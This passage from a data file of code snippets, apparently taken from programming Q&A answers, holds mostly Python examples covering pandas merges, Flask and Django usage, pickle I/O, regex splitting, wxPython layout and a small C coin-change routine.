            method(*args, **kwargs)

    @operation
    def operation_a(self, *args, **kwargs):
        print "A"

    @operation
    def operation_b(self, *args, **kwargs):
        print "B"

    def not_an_operation(self):
        print "not me"
</snippet></ROW><ROW><id>20381992</id><snippet>class Test(object):

    def run_operations(self, operation, *args, **kwargs):
        method = getattr(self.operations, operation, None)
        if method is None: 
            # raise or log or whatever
        else:
            method(self, *args, **kwargs)

    class operations(object):
        @classmethod
        def operation_a(cls, instance, *args, **kwargs):
            print "A"

        @classmethod
        def operation_b(cls, instance, *args, **kwargs):
            print "B"
</snippet></ROW><ROW><id>20382027</id><snippet>request.get_json()</snippet></ROW><ROW><id>20382027</id><snippet>force</snippet></ROW><ROW><id>20382027</id><snippet>True</snippet></ROW><ROW><id>20382027</id><snippet>data = request.get_json(force=True)
</snippet></ROW><ROW><id>20382143</id><snippet>set</snippet></ROW><ROW><id>20382542</id><snippet>signals_available = False
try:
    from blinker import Namespace
    signals_available = True
except ImportError:
    class Namespace(object):
        def signal(self, name, doc=None):
            return _FakeSignal(name, doc)
</snippet></ROW><ROW><id>20382542</id><snippet>blinker</snippet></ROW><ROW><id>20382542</id><snippet>_FakeSignal</snippet></ROW><ROW><id>20382542</id><snippet>_FakeSignal</snippet></ROW><ROW><id>20382542</id><snippet>connect_via</snippet></ROW><ROW><id>20382542</id><snippet>class _FakeSignal(object):
    """If blinker is unavailable, create a fake class with the same
    interface that allows sending of signals but will fail with an
    error on anything else.  Instead of doing anything on send, it
    will just ignore the arguments and do nothing instead.
    """

    def __init__(self, name, doc=None):
        self.name = name
        self.__doc__ = doc
    def _fail(self, *args, **kwargs):
        raise RuntimeError('signalling support is unavailable '
                           'because the blinker library is '
                           'not installed.')
    send = lambda *a, **kw: None
    connect = disconnect = has_receivers_for = receivers_for = \
        temporarily_connected_to = connected_to = _fail
    del _fail
</snippet></ROW><ROW><id>20382542</id><snippet>connect_via</snippet></ROW><ROW><id>20382542</id><snippet>blinker</snippet></ROW><ROW><id>20382542</id><snippet>blinker</snippet></ROW><ROW><id>20382542</id><snippet>connect_via</snippet></ROW><ROW><id>20382779</id><snippet>TOTAL MAP TASK</snippet></ROW><ROW><id>20382779</id><snippet>mapred.tasktracker.map.tasks.maximum</snippet></ROW><ROW><id>20382779</id><snippet>mapred.tasktracker.map.tasks.maximum</snippet></ROW><ROW><id>20382779</id><snippet>TOTAL MAP TASK</snippet></ROW><ROW><id>20382836</id><snippet>int</snippet></ROW><ROW><id>20382836</id><snippet>y = 250 - ((A*(x)**B)+(C*(x**D))+(E*(x))+c)
</snippet></ROW><ROW><id>20382836</id><snippet>2(5)</snippet></ROW><ROW><id>20382836</id><snippet>2*5</snippet></ROW><ROW><id>20382836</id><snippet>A(x)</snippet></ROW><ROW><id>20382836</id><snippet>A</snippet></ROW><ROW><id>20382836</id><snippet>x</snippet></ROW><ROW><id>20382862</id><snippet>chapters = filter(None,map(str.strip,text.split("\n\n")))
</snippet></ROW><ROW><id>20383024</id><snippet>&gt;&gt;&gt; silhouette_score(iris.data, iris.target, sample_size=50)
0.52999903616584543
</snippet></ROW><ROW><id>20383045</id><snippet>self</snippet></ROW><ROW><id>20383045</id><snippet>SelectMonthDialog</snippet></ROW><ROW><id>20383045</id><snippet>self</snippet></ROW><ROW><id>20383045</id><snippet>SelectMonthDialog</snippet></ROW><ROW><id>20383045</id><snippet>self</snippet></ROW><ROW><id>20383063</id><snippet>core</snippet></ROW><ROW><id>20383063</id><snippet>#myproject/core/myresources.py
from import_export import resources
from core.models import Book


class BookResource(resources.ModelResource):

    class Meta:
        model = Book
</snippet></ROW><ROW><id>20383063</id><snippet>from core.myresources import BookResource

dataset = BookResource().export()
</snippet></ROW><ROW><id>20383469</id><snippet>merge</snippet></ROW><ROW><id>20383469</id><snippet>update</snippet></ROW><ROW><id>20383469</id><snippet>In [1]: import pandas
In [2]: df1 = pandas.read_csv('df1.csv')
In [3]: df2 = pandas.read_csv('df2.csv')
In [4]: df1
Out[4]: 
   value method  number  price
0   0.50    add  489245    600
1   0.70    add  489245    NaN
2   0.70    mul  584682    225
3   0.90    mul  624602    NaN
4   0.95    mul  624602    NaN
5   0.99    mul  624602    NaN
6    NaN    NaN  900000    300
7    NaN    add  900000    NaN
8    NaN    NaN     NaN    NaN

In [5]: df2
Out[5]: 
   number  price loc  get
0  489245    200  aa  up 
1  584682    NaN  ab  NaN
2  624602    NaN  bb  NaN
3  900000    NaN  cc  dn 
</snippet></ROW><ROW><id>20383469</id><snippet>'number'</snippet></ROW><ROW><id>20383469</id><snippet>In [6]: mdf = pandas.merge(df1,df2,on='number')
In [7]: mdf
Out[7]: 
   value method  number  price_x  price_y loc  get
0   0.50    add  489245      600      200  aa  up 
1   0.70    add  489245      NaN      200  aa  up 
2   0.70    mul  584682      225      NaN  ab  NaN
3   0.90    mul  624602      NaN      NaN  bb  NaN
4   0.95    mul  624602      NaN      NaN  bb  NaN
5   0.99    mul  624602      NaN      NaN  bb  NaN
6    NaN    NaN  900000      300      NaN  cc  dn 
7    NaN    add  900000      NaN      NaN  cc  dn 
</snippet></ROW><ROW><id>20383469</id><snippet>pandas.merge</snippet></ROW><ROW><id>20383469</id><snippet>'price_x'</snippet></ROW><ROW><id>20383469</id><snippet>'price_y'</snippet></ROW><ROW><id>20383469</id><snippet>'price'</snippet></ROW><ROW><id>20383469</id><snippet>'price_y'</snippet></ROW><ROW><id>20383469</id><snippet>'price'</snippet></ROW><ROW><id>20383469</id><snippet>In [8]: pdf = mdf.price_y
In [9]: pdf = pandas.DataFrame(pdf)

In [10]: del mdf['price_y']

In [11]: mdf.rename(columns = {'price_x':'price'},inplace=True)
In [12]: pdf.rename(columns = {'price_y':'price'},inplace=True)
In [13]: mdf
Out[13]: 
   value method  number  price loc  get
0   0.50    add  489245    600  aa  up 
1   0.70    add  489245    NaN  aa  up 
2   0.70    mul  584682    225  ab  NaN
3   0.90    mul  624602    NaN  bb  NaN
4   0.95    mul  624602    NaN  bb  NaN
5   0.99    mul  624602    NaN  bb  NaN
6    NaN    NaN  900000    300  cc  dn 
7    NaN    add  900000    NaN  cc  dn 

In [14]: pdf
Out[14]: 
   price
0    200
1    200
2    NaN
3    NaN
4    NaN
5    NaN
6    NaN
7    NaN
</snippet></ROW><ROW><id>20383469</id><snippet>.update</snippet></ROW><ROW><id>20383469</id><snippet>pdf</snippet></ROW><ROW><id>20383469</id><snippet>mdf</snippet></ROW><ROW><id>20383469</id><snippet>In [15]: mdf.update(pdf)

In [16]: mdf
Out[16]: 
   value method  number  price loc  get
0   0.50    add  489245    200  aa  up 
1   0.70    add  489245    200  aa  up 
2   0.70    mul  584682    225  ab  NaN
3   0.90    mul  624602    NaN  bb  NaN
4   0.95    mul  624602    NaN  bb  NaN
5   0.99    mul  624602    NaN  bb  NaN
6    NaN    NaN  900000    300  cc  dn 
7    NaN    add  900000    NaN  cc  dn 
</snippet></ROW><ROW><id>20383469</id><snippet>mdf.update(pdf)</snippet></ROW><ROW><id>20383469</id><snippet>mdf.combine(pdf, function_of_two_variables_returning_preferred_value)</snippet></ROW><ROW><id>20383525</id><snippet>if self.timeNum == self.timeTarget:
    # ...
    self.timeNum += 1
</snippet></ROW><ROW><id>20383525</id><snippet>self.timeNum</snippet></ROW><ROW><id>20383525</id><snippet>self.timeTarget</snippet></ROW><ROW><id>20383525</id><snippet>self.timeNum</snippet></ROW><ROW><id>20383525</id><snippet>if self.timeNum == self.timeTarget:
    # ...
    # inside of `if`
    self.timeNum = 0

# outside of `if`
self.timeNum += 1
</snippet></ROW><ROW><id>20383545</id><snippet>class test(object):
    def __init__(self,name):
        self.name=name

    def show(self):
        print self.name

ob1=test('object 1')
ob2=test('object 2')

l=[]
l.append(ob1)
l.append(ob2)

l[0].show()
l[1].show()
</snippet></ROW><ROW><id>20383897</id><snippet>0</snippet></ROW><ROW><id>20383897</id><snippet>row,cols=3,3</snippet></ROW><ROW><id>20383897</id><snippet>getMove()</snippet></ROW><ROW><id>20383897</id><snippet>row = readInt("  Row --&gt; ")-1
col = readInt("  Col --&gt; ")-1
</snippet></ROW><ROW><id>20383929</id><snippet>print</snippet></ROW><ROW><id>20383929</id><snippet>print("%4d" % (i * n), end=" ")
</snippet></ROW><ROW><id>20383995</id><snippet>category = Category.objects.filter(name=category_name, user__username=user)[0]
</snippet></ROW><ROW><id>20383995</id><snippet>categories = Category.objects.filter(name=category_name, user__username=user)
category = None
if categories:
   category = categories[0]
</snippet></ROW><ROW><id>20384077</id><snippet>Bio.PDB</snippet></ROW><ROW><id>20384077</id><snippet>__init__.py</snippet></ROW><ROW><id>20384077</id><snippet>from Bio.PDB import *</snippet></ROW><ROW><id>20384077</id><snippet>__init__.py</snippet></ROW><ROW><id>20384077</id><snippet>__init__.py</snippet></ROW><ROW><id>20384077</id><snippet>MMCIFParser</snippet></ROW><ROW><id>20384077</id><snippet>MMCIF2Dict</snippet></ROW><ROW><id>20384077</id><snippet>MMCIFParser</snippet></ROW><ROW><id>20384077</id><snippet>MMCIF2Dict</snippet></ROW><ROW><id>20384077</id><snippet>from Bio.PDB import MMCIF2Dict; mmcif_dict = MMCIF2Dict.MMCIF2Dict(cifFile)</snippet></ROW><ROW><id>20384077</id><snippet>from Bio.PDB import *</snippet></ROW><ROW><id>20384077</id><snippet>MMCIF2Dict</snippet></ROW><ROW><id>20384092</id><snippet>from itertools import chain
addons = list(chain.from_iterable(col.addons for col in collections))
</snippet></ROW><ROW><id>20384139</id><snippet>findAll</snippet></ROW><ROW><id>20384139</id><snippet>find</snippet></ROW><ROW><id>20384139</id><snippet>find('p', class='row')</snippet></ROW><ROW><id>20384139</id><snippet>results.find('p','row').find('a')['href']
</snippet></ROW><ROW><id>20384195</id><snippet>datetime.strptime</snippet></ROW><ROW><id>20384195</id><snippet>datetime.strptime(date_string, format)
</snippet></ROW><ROW><id>20384221</id><snippet>import operator
if len(input_set &amp; reduce(operator.__or__, user_set)) == 0:
</snippet></ROW><ROW><id>20384221</id><snippet>user_set = (set([1, 2]), set([3, 4]))
</snippet></ROW><ROW><id>20384221</id><snippet>set([1, 2, 3, 4])
</snippet></ROW><ROW><id>20384261</id><snippet>open()</snippet></ROW><ROW><id>20384261</id><snippet>pickle.dump()</snippet></ROW><ROW><id>20384261</id><snippet>s = open('studentInfo.dat', 'wb')
pickle.dump(info, s)
</snippet></ROW><ROW><id>20384261</id><snippet>pickle.load()</snippet></ROW><ROW><id>20384261</id><snippet>f = open('studentInfo.dat', 'rb')
info = pickle.load(f)
</snippet></ROW><ROW><id>20384261</id><snippet>shelve</snippet></ROW><ROW><id>20384261</id><snippet>with open('studentInfo.dat', 'wb') as outputfile:
    pickle.dump(info, outputfile)
</snippet></ROW><ROW><id>20384261</id><snippet>with open('studentInfo.dat', 'rb') as inputfile:
    info = pickle.load(inputfile)
</snippet></ROW><ROW><id>20384261</id><snippet>info</snippet></ROW><ROW><id>20384261</id><snippet>info</snippet></ROW><ROW><id>20384261</id><snippet>def write_to_file():
    # take input and add that to `info` here.
    # gather a name, GPA and ID into `new_name`, `new_gpa` and `new_id`
    info.append([("student", new_name),("GPA", new_gpa), ("ID", new_id)])

    with open('studentInfo.dat', 'wb') as outputfile:
        pickle.dump(info, outputfile)
</snippet></ROW><ROW><id>20384261</id><snippet>read_file()</snippet></ROW><ROW><id>20384261</id><snippet>info</snippet></ROW><ROW><id>20384261</id><snippet>global</snippet></ROW><ROW><id>20384261</id><snippet>def read_file():
    with open('studentInfo.dat', 'rb') as inputfile:
        info = pickle.load(inputfile)
    return info
</snippet></ROW><ROW><id>20384261</id><snippet>info</snippet></ROW><ROW><id>20384261</id><snippet>read_info = read_file()
print("Here is the student information: \n")
print(read_info)
</snippet></ROW><ROW><id>20384317</id><snippet>loc</snippet></ROW><ROW><id>20384317</id><snippet>In [2]: type(df.loc[[3]])
Out[2]: pandas.core.frame.DataFrame

In [3]: type(df.loc[[1]])
Out[3]: pandas.core.frame.DataFrame
</snippet></ROW><ROW><id>20384459</id><snippet>if ("Clerk") or ("Stock") or ("Sales" in jobs['Roles']):
</snippet></ROW><ROW><id>20384459</id><snippet>True</snippet></ROW><ROW><id>20384459</id><snippet># Notice how I replaced `jobs['Roles']` with `i['Roles']`
if "Clerk" in i['Roles'] or "Stock" in i['Roles'] or "Sales" in i['Roles']:
</snippet></ROW><ROW><id>20384459</id><snippet>if any(x in i['Roles'] for x in ("Clerk", "Stock", "Sales")):
</snippet></ROW><ROW><id>20384574</id><snippet>argv</snippet></ROW><ROW><id>20384574</id><snippet>args</snippet></ROW><ROW><id>20384574</id><snippet>parser.parse_args()</snippet></ROW><ROW><id>20384574</id><snippet>sys.argv[1:]</snippet></ROW><ROW><id>20384574</id><snippet>argv[0]</snippet></ROW><ROW><id>20384574</id><snippet>args = parser.parse_args()
</snippet></ROW><ROW><id>20384574</id><snippet>argparse</snippet></ROW><ROW><id>20384574</id><snippet>def parse_known_args(self, args=None, namespace=None):
    if args is None:
        # args default to the system args
        args = _sys.argv[1:]
</snippet></ROW><ROW><id>20384714</id><snippet>print('{}\t{:.2f}\t{}'.format(*l))
</snippet></ROW><ROW><id>20384714</id><snippet>.format()</snippet></ROW><ROW><id>20384714</id><snippet>print('0[0] 0[1] 0[2]'.format(l))
</snippet></ROW><ROW><id>20384714</id><snippet>&gt;&gt;&gt; print('\t'.join("{:.2f}".format(x) if isinstance(x, float) else str(x) for k
 in l for x in k))
</snippet></ROW><ROW><id>20384730</id><snippet>str.split()</snippet></ROW><ROW><id>20384730</id><snippet>'^\n\n'</snippet></ROW><ROW><id>20384730</id><snippet>&gt;&gt;&gt; 'Text with newlines\n\nand a caret at the end^\n\nwhich will be split'.split('^\n\n')
['Text with newlines\n\nand a caret at the end', 'which will be split']
</snippet></ROW><ROW><id>20384730</id><snippet>re</snippet></ROW><ROW><id>20384730</id><snippet>import re

re.split(r'^\n\n', paragraphs, flags=re.MULTILINE)
</snippet></ROW><ROW><id>20384730</id><snippet>re.MULTILINE</snippet></ROW><ROW><id>20384730</id><snippet>^</snippet></ROW><ROW><id>20384730</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; re.split(r'^\n\n', 'Cool\n\n\nNew paragraph\nruns here\n\n\nAnother paragraph?', flags=re.MULTILINE)
['Cool\n', 'New paragraph\nruns here\n', 'Another paragraph?']
</snippet></ROW><ROW><id>20384730</id><snippet>$\n\n</snippet></ROW><ROW><id>20384730</id><snippet>&gt;&gt;&gt; re.split(r'$\n\n', 'Cool\n\nNew paragraph\nruns here\n\nAnother paragraph?', flags=re.MULTILINE)
['Cool', 'New paragraph\nruns here', 'Another paragraph?']
</snippet></ROW><ROW><id>20385025</id><snippet>DJANGO_SETTINGS_MODULE</snippet></ROW><ROW><id>20385025</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>20385025</id><snippet>blah</snippet></ROW><ROW><id>20385025</id><snippet>- blah_project/
    - blah/
        - manage.py
        - blah/
            - ...
            - settings/
                 - __init__.py
                 - local.py
                 - production.py
                 - ...
</snippet></ROW><ROW><id>20385025</id><snippet>bash</snippet></ROW><ROW><id>20385025</id><snippet>export DJANGO_SETTINGS_MODULE=blah.settings.local
export PYTHONPATH=/full/path/to/blah_project/blah
</snippet></ROW><ROW><id>20385025</id><snippet>django-admin.py</snippet></ROW><ROW><id>20385025</id><snippet>django</snippet></ROW><ROW><id>20385025</id><snippet>venv</snippet></ROW><ROW><id>20385025</id><snippet>django-admin.py runserver
</snippet></ROW><ROW><id>20385160</id><snippet>randint()</snippet></ROW><ROW><id>20385160</id><snippet>while</snippet></ROW><ROW><id>20385160</id><snippet>input()</snippet></ROW><ROW><id>20385160</id><snippet>randint()</snippet></ROW><ROW><id>20385160</id><snippet>while</snippet></ROW><ROW><id>20385160</id><snippet>def zahlen(schein, function, *arguments):
    if len(schein) &lt; 6:
        schein.append(function(*arguments))
        return zahlen(schein, function, *arguments)
    return schein
</snippet></ROW><ROW><id>20385160</id><snippet>lottoschein = zahlen(lottoschein, lambda: int(input("Bitte geben sie eine Zahl ein: "))))
gewinnzahlen = zahlen(gewinnzahlen, randint, 1, 49)
</snippet></ROW><ROW><id>20385160</id><snippet>lambda: int(input('....'))</snippet></ROW><ROW><id>20385160</id><snippet>randint</snippet></ROW><ROW><id>20385160</id><snippet>1</snippet></ROW><ROW><id>20385160</id><snippet>49</snippet></ROW><ROW><id>20385160</id><snippet>&gt;&gt;&gt; def zahlen(schein, function, *arguments):
...     if len(schein) &lt; 6:
...         schein.append(function(*arguments))
...         return zahlen(schein, function, *arguments)
...     return schein
... 
&gt;&gt;&gt; from random import randint
&gt;&gt;&gt; zahlen([], randint, 1, 49)
[42, 11, 41, 28, 27, 24]
&gt;&gt;&gt; zahlen([], lambda: int(input('Please enter a number: ')))
Please enter a number: 10
Please enter a number: 20
Please enter a number: 30
Please enter a number: 42
Please enter a number: 38
Please enter a number: 2
[10, 20, 30, 42, 38, 2]
</snippet></ROW><ROW><id>20385457</id><snippet>self.response.write(person.pdf)
</snippet></ROW><ROW><id>20385666</id><snippet>import wx
from wx.lib.scrolledpanel import ScrolledPanel 

class Tester(wx.Frame):
    def __init__(self):
        wx.Frame.__init__(self, None, -1, "Window")
        self.panel = ScrolledPanel(parent=self, id=-1)
        self.panel.SetupScrolling()
        self.sizerItems = []

        Btn1 = wx.Button(self.panel, -1, "I'm a Button!") 
        Btn2 = wx.Button(self.panel, -1, "Me Too!") 
        Btn3 = wx.Button(self.panel, -1, "Hey! Quiet up there!") 
        Btn4 = wx.Button(self.panel, -1, "Jeez Frank, relax") 


        vbox = wx.BoxSizer(wx.VERTICAL)
        hbox1 = wx.BoxSizer(wx.HORIZONTAL)
        hbox2 = wx.BoxSizer(wx.HORIZONTAL)

        hbox1.Add(Btn1, flag=wx.LEFT|wx.RIGHT|wx.TOP, border=10)
        hbox1.Add(Btn2, flag=wx.LEFT|wx.RIGHT|wx.TOP, border=10)
        hbox2.Add(Btn3, flag=wx.LEFT|wx.RIGHT|wx.TOP, border=10)
        hbox2.Add(Btn4, flag=wx.LEFT|wx.RIGHT|wx.TOP, border=10)

        vbox.Add(hbox1, flag=wx.EXPAND|wx.LEFT|wx.RIGHT|wx.TOP|wx.BOTTOM, border=25)
        vbox.Add(hbox2, flag=wx.EXPAND|wx.LEFT|wx.RIGHT|wx.TOP|wx.BOTTOM, border=25)

        self.panel.SetSizer(vbox)
        self.panel.Layout()

        self.GetAllChildren(self.panel.GetSizer())
        print self.sizerItems

    def GetAllChildren(self, item):
        for sizerItem in item.GetChildren():
            widget = sizerItem.GetWindow()
            if not widget:
                # then it's probably a sizer
                sizer = sizerItem.GetSizer()
                if isinstance(sizer, wx.Sizer):
                    self.GetAllChildren(sizer)
            else:
                self.sizerItems.append(widget)

#----------------------------------------------------------------------
if __name__ == "__main__":
    app = wx.App(False)
    Tester().Show()
    app.MainLoop()
</snippet></ROW><ROW><id>20385666</id><snippet>for item in self.sizerItems: 
    print item.GetLabel()
</snippet></ROW><ROW><id>20385687</id><snippet>def put(self, id):
        if checkUser(id):
            args = self.reqparse.parse_args()
            deleteUser(id)      #Deletes user with this id
            addUser(User(args['name'], args['email'], args['password'], args['role']))
            # Missing return when succees
        abort(404) # Always executing
</snippet></ROW><ROW><id>20385687</id><snippet>from flask import Flask
from flask.ext.restful import Api, Resource
from flask.ext.restful import reqparse


app = Flask(__name__)
api = Api(app)


class UserAPI(Resource):
    def __init__(self):
        self.reqparse = reqparse.RequestParser()
        self.reqparse.add_argument('name', type = str, required = True, help = "No name provided", location = 'json')
        self.reqparse.add_argument('email', type = str, required = True, help = "No email provided", location = 'json')
        self.reqparse.add_argument('password', type = str, required = True, help = "No password provided", location = 'json')
        super(UserAPI, self).__init__()

    def get(self, id):
        if True: #Just checks to see if user with that id exists
            return {"message": "You have GET me"}
        abort(404)

    def put(self, id):
        if True:
            return {"message": "You have PUT me"}
        abort(404)

    def delete(self, id):
        deleteUser(id)
        return { 'result': True}

class UserListAPI(Resource):
    def __init__(self):
        self.reqparse = reqparse.RequestParser()
        self.reqparse.add_argument('name', type = str, required = True, help = "No name provided", location = 'json')
        self.reqparse.add_argument('email', type = str, required = True, help = "No email provided", location = 'json')
        self.reqparse.add_argument('password', type = str, required = True, help = "No password provided", location = 'json')
        self.reqparse.add_argument('role', type = bool, default = 0, location = 'json')
        super(UserListAPI, self).__init__()

    def get(self):
        return { 'users': map(lambda u: marshal(u, user_fields), getAllUsers()) }

    def post(self):
        print self.reqparse.parse_args()
        args = self.reqparse.parse_args()
        new_user = User(args['name'], args['email'], args['password'], args['role'])
        addUser(new_user)
        return {'user' : marshal(new_user, user_fields)}, 201

api.add_resource(UserAPI, '/api/user/&lt;int:id&gt;', endpoint = 'user')
api.add_resource(UserListAPI, '/api/users/', endpoint = 'users')


if __name__ == "__main__":

    app.run(debug=True)
</snippet></ROW><ROW><id>20385687</id><snippet>amegian@amegian-Ubuntu:~$ curl -H 'Content-Type: application/json' -X PUT -d '{"name": "test2", "email":"test@test.com", "password":"testpass", "role": 0}' http://127.0.0.1:5000/api/user/2 -v
* About to connect() to 127.0.0.1 port 5000 (#0)
*   Trying 127.0.0.1... connected
&gt; PUT /api/user/2 HTTP/1.1
&gt; User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
&gt; Host: 127.0.0.1:5000
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 76
&gt; 
* upload completely sent off: 76out of 76 bytes
* HTTP 1.0, assume close after body &lt; HTTP/1.0 200 OK &lt; Content-Type: application/json &lt; Content-Length: 39 &lt; Server: Werkzeug/0.8.3 Python/2.7.3 &lt; Date: Wed, 04 Dec 2013 21:08:40 GMT &lt;  {
    "message": "You have PUT me" }
* Closing connection #0
</snippet></ROW><ROW><id>20385691</id><snippet>No aprobó ni está inscripto a ([^()]*)( \(Ord\. 1150\))?
</snippet></ROW><ROW><id>20385691</id><snippet>import re
myString = "No aprobó ni está inscripto a Sistemas Operativos (Ord. 1150)"
result = re.search('No aprobó ni está inscripto a ([^()]*)( \(Ord\. 1150\))?', myString)
course = result.group(1) // may have a trailing space, so maybe strip()
</snippet></ROW><ROW><id>20385714</id><snippet>p = subprocess.Popen("php /path/to/file 'data=this'", shell=True, stdout=subprocess.PIPE)
</snippet></ROW><ROW><id>20385714</id><snippet>$data = $argv[1];
</snippet></ROW><ROW><id>20385863</id><snippet>- kind: Prefix
  properties:
  - name: list_name
  - name: added_in

- kind: Prefix
  properties:
  - name: hostkey
  - name: added_in

- kind: Prefix
  properties:
  - name: deleted_in
  - name: added_in
</snippet></ROW><ROW><id>20385863</id><snippet>- kind: Prefix
  properties:
  - name: hostkey
  - name: deleted_in
  - name: added_in
</snippet></ROW><ROW><id>20385989</id><snippet>total = 0
for key, value in month_dictionary.iteritems():
    total += value
    month_dictionary[key] = total
</snippet></ROW><ROW><id>20385989</id><snippet>&gt;&gt;&gt; from collections import OrderedDict
&gt;&gt;&gt; month_dictionary = OrderedDict((('012013', 3), ('022013', 1), ('032013', 5)))
&gt;&gt;&gt; total = 0
&gt;&gt;&gt; for key, value in month_dictionary.iteritems():
...     total += value
...     month_dictionary[key] = total
... 
&gt;&gt;&gt; month_dictionary
OrderedDict([('012013', 3), ('022013', 4), ('032013', 9)])
</snippet></ROW><ROW><id>20386174</id><snippet>data.append(copy.copy(line))
</snippet></ROW><ROW><id>20386174</id><snippet>data.extend(line)
</snippet></ROW><ROW><id>20386181</id><snippet>    #include &lt;stdlib.h&gt;
    #include &lt;stdio.h&gt;
    #include &lt;stdint.h&gt;

    int min_change0(int *V, int i, int aC)
    {
      if (aC == 0) {
        return 0;
      } else if (i == -1 || aC &lt; 0) {
        return INT32_MAX - 1;
      } else {
        int a = min_change0(V, i-1, aC);
        int b = 1 + min_change0(V, i, aC - V[i]);
        return a &lt;= b ? a : b;
      }
    }

    int min_change(int *V, int C)
    {
      int len = 0;
      while (V[len]) len++;
      /* min_coins(len(V)-1, C) */
      return len ? min_change0(V, len-1, C) : -1;
    }

    int main(void)
    {
      int total = 123;
      int values[] = {1,5,10,25,50,0 /* sentinel */};
      printf("minimal number of coins to change %i with 1, 5, 10, 25 and 50 coins is %i\n",
             total,
             min_change(values, total)
             );
      return 0;
    }
</snippet></ROW><ROW><id>20386676</id><snippet>owner = ForeignKey(Owner, db_column='jobmst_owner')
</snippet></ROW><ROW><id>20386676</id><snippet>Owner.objects.values('owner_name').annotate(num_jobs=Count('jobmst')).order_by('-num_jobs')[:10]
</snippet></ROW><ROW><id>20386676</id><snippet>annotate</snippet></ROW><ROW><id>20386676</id><snippet>values_list</snippet></ROW><ROW><id>20386676</id><snippet>owners_qs = Owner.objects.values... # as above
owners_with_counts = ((owner.owner_name, owner.num_jobs) for owner in owners_qs)
</snippet></ROW><ROW><id>20386756</id><snippet>matches = filter(None, map(findit, out))
</snippet></ROW><ROW><id>20386756</id><snippet>None</snippet></ROW><ROW><id>20387044</id><snippet>&gt;&gt;&gt; def make_links(data):
        'Create a dictionary mapping nodes to a set of their successors'
        links = {}
        for row in data:
            nodes = row.replace(' ', '').split('-&gt;')
            for a, b in zip(nodes[:-1], nodes[1:]):
                links.setdefault(a, set()).add(b)
        return links

&gt;&gt;&gt; def draw_tree(links, start, depth=0):
        'Recursively print a tree from a given starting point and given depth'
        print('   ' * depth + start)
        for node in sorted(links.get(start, [])):
            draw_tree(links, node, depth+1)

&gt;&gt;&gt; data = ['A', 'A -&gt; B -&gt; C -&gt; D -&gt; Z', 'A -&gt; B -&gt; O', 'A -&gt; X']

&gt;&gt;&gt; links = make_links(data)
&gt;&gt;&gt; links
{'A': {'X', 'B'}, 'C': {'D'}, 'B': {'C', 'O'}, 'D': {'Z'}}

&gt;&gt;&gt; draw_tree(links, start='A')
A
   B
      C
         D
            Z
      O
   X
</snippet></ROW><ROW><id>20387063</id><snippet>from bs4 import BeautifulSoup
from collections import namedtuple
import csv
from itertools import tee, izip
import os, os.path
import re

DIR       = r'C:\Users\Documents\Congressional Hearings\NHTF Project\Test Set'
HARD_WRAP = re.compile(r'\n(?!    )')
SPEAKERS  = re.compile(r'^    (Mr.|Mrs.|Congressman|Congresswoman|Chairman|Chairwoman) ([a-zA-Z \-]{2,40})\.', re.MULTILINE)
NAME      = lambda m: '{0} {1}'.format(*m.groups())
Speaker   = namedtuple('Speaker', ['name', 'name_start', 'name_end'])

def load_hearing_response(fname, split_on='    Present:'):
    with open(fname, 'rU') as inf:
        html = inf.read()
    txt  = BeautifulSoup(html).get_text()
    return txt.rsplit(split_on, 1)[-1]     # return everything after last occurrence of split_on

def un_hard_wrap(txt, reg=HARD_WRAP):
    return reg.sub('', txt)

def pairwise(iterable):
    a,b = tee(iterable)
    next(b, None)
    return izip(a, b)

def get_speeches(txt):
    speakers = [Speaker(NAME(sp), sp.start(), sp.end()) for sp in SPEAKERS.finditer(txt)]
    speakers.append(Speaker('', len(txt), None))    # tail sentinel for pairwise processing
    return [(this.name, txt[this.name_end:nxt.name_start]) for this,nxt in pairwise(speakers)]

def write_csv(fname, data, header=None):
    with open(fname, 'wb') as outf:
        out_csv = csv.writer(outf)
        if header is not None:
            out_csv.writerow(header)
        out_csv.writerows(data)

def main():
    # get text of Congressional hearing responses
    txt = load_hearing_response(os.path.join(DIR, 'CHRG-107hhrg70750.htm'))
    txt = un_hard_wrap(txt)
    # break into speeches
    speeches = get_speeches(txt)
    # write (speaker, speech) pairs to a .csv file
    write_csv(os.path.join(DIR, 'CHRG-107hhrg70750.csv'), speeches, ['Speaker', 'Speech'])
    # write paragraphs of speeches to a .csv file
    paragraphs = ([para.strip()] for speaker,speech in speeches for para in speech.split('\n') if para.strip())
    write_csv(os.path.join(DIR, 'Paragraphs.csv'), paragraphs, ['Paragraphs'])

if __name__=="__main__":
    main()
</snippet></ROW><ROW><id>20387063</id><snippet>un_hard_wrap()</snippet></ROW><ROW><id>20387063</id><snippet>get_speeches()</snippet></ROW><ROW><id>20387063</id><snippet>sp.pos</snippet></ROW><ROW><id>20387063</id><snippet>sp.start()</snippet></ROW><ROW><id>20387063</id><snippet>sp.end_pos</snippet></ROW><ROW><id>20387063</id><snippet>sp.end()</snippet></ROW><ROW><id>20387063</id><snippet>SPEAKERS</snippet></ROW><ROW><id>20387063</id><snippet>{2,40}</snippet></ROW><ROW><id>20387063</id><snippet>{2,26}</snippet></ROW><ROW><id>20387063</id><snippet>... if para.strip()</snippet></ROW><ROW><id>20387063</id><snippet>paragraphs</snippet></ROW><ROW><id>20387074</id><snippet>reduce</snippet></ROW><ROW><id>20387074</id><snippet>def subdict(sub, key):
    return { key: sub }

d = reduce(subdict, reversed(keys), {})
</snippet></ROW><ROW><id>20387074</id><snippet>functools.reduce</snippet></ROW><ROW><id>20387143</id><snippet>FILE=`find ~/Desktop/folder -name '*.tif'`
gdal_merge.py -o mosaic -of GTiff "$FILE"
</snippet></ROW><ROW><id>20387660</id><snippet>combined_dict = {key: {'first_dict': first_dict[key], 'second_dict': second_dict[key]} 
                 for key in first_dict.viewkeys() &amp; second_dict}
